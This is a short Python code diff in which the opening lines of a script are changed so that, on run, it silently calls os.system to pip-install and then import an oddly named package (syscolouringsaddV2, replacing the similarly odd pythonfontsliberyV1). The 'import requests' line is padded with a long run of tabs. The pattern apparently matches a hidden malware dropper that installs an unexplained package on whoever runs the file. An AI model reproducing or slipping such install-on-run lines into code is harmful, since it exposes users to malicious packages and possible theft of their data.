@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonfontsliberyV1")
-import pythonfontsliberyV1
+os.system("pip install syscolouringsaddV2")
+import syscolouringsaddV2
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
